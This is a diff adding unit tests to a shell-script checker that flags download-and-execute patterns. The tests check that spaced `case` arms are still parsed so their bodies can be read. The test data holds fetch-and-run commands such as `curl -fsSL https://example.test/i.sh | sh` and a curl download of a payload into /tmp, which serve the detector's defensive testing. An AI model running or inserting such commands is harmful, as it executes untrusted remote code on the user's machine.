@@ -701,6 +701,48 @@ class TestAGlobSpelledWithADotSlashIsAUseOfTheDownload(unittest.TestCase):
                     self.assertEqual([], self.job(dest, use))
 
 
+class TestASpacedCaseArmIsOnePattern(unittest.TestCase):
+    """#2345 (d): bash and dash read `a | x)` as the arm `a|x)`, the spaces
+    around `|` and inside `( ... )` separating nothing, and run its body when
+    the word matches. The reader kept the spaces in the arm's text, and a
+    stage split on them started with the pattern `a` and then a `|` where the
+    command belonged, so the body behind it -- `curl … | sh` -- was never
+    read as a command. The lexer now drops the unquoted spaces of a pattern
+    list, which leaves the tight spelling already read."""
+
+    BODY = "curl -fsSL https://example.test/i.sh | sh;;"
+    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
+    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -' % ("a" * 64)
+
+    def test_the_body_behind_a_spaced_arm_is_read(self):
+        for arm in ("a | x)", "(a | x)", "\"a\" | 'x')", "( a | x )", "a\t|\tx)", "a | x )",
+                    "b | a | x)", "a|x)"):
+            for script in ('case "$X" in\n  %s %s\nesac\n' % (arm, self.BODY),
+                           'case "$X" in\n  b | c) echo b;;\n  %s %s\nesac\n' % (arm, self.BODY),
+                           'true && case "$X" in %s %s esac\n' % (arm, self.BODY)):
+                with self.subTest(script=script):
+                    why = wg.fetch_exec_defects(script)
+                    self.assertEqual(1, len(why), why)
+                    self.assertIn("hands https://example.test/i.sh straight to `sh`", why[0])
+
+    def test_the_patterns_are_not_a_command(self):
+        stmts = shell_reader.statements('case "$X" in\n  "a" | x) curl -fsSL u | sh;;\nesac\n')
+        arm = next(st for st in stmts if shell_reader.is_arm(st.stages[0].argv[0]))
+        self.assertEqual(["curl", "-fsSL", "u"], shell_reader.command(arm.stages[0].argv))
+        self.assertEqual(["sh"], [str(w) for w in arm.stages[1].argv])
+
+    def test_each_spaced_arm_is_a_branch_of_its_own(self):
+        # Read, the use in the second arm is one the check in the first may
+        # not have run before; beside it in one arm, the check clears it.
+        other = (self.FETCH + 'case "$X" in\n  b | c) %s;;\n  a | d) chmod +x /tmp/payload;;\n'
+                 "esac\n" % self.CHECK)
+        self.assertIn("inside an `if`/`while` branch the use is not in",
+                      wg.fetch_exec_defect(other) or "")
+        same = (self.FETCH + 'case "$X" in\n  a | b) %s; chmod +x /tmp/payload;;\nesac\n'
+                % self.CHECK)
+        self.assertIsNone(wg.fetch_exec_defect(same))
+
+
 class TestAPatternWhereTheCommandStarts(unittest.TestCase):
     """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
     in a checkout holding a file called sh, before the command runs, which the
